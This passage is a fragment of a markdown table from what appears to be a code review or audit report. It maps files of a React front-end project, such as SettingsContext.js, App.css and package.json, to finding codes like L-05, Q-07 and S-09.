| `src/components/AnimatedScore.{js,css}` | L-05, Q-13 |
| `src/contexts/SettingsContext.js` | L-03, D-07 |
| `src/config/api.js` | L-15 |
| `src/index.js` | Q-01, Q-10 |
| `src/App.css` | L-05, Q-06, Q-07, A-04 |
| `public/index.html` | Q-07, Q-08 |
| `package.json` | S-09, Q-03 |
| `src/App.test.js` | Q-02 |
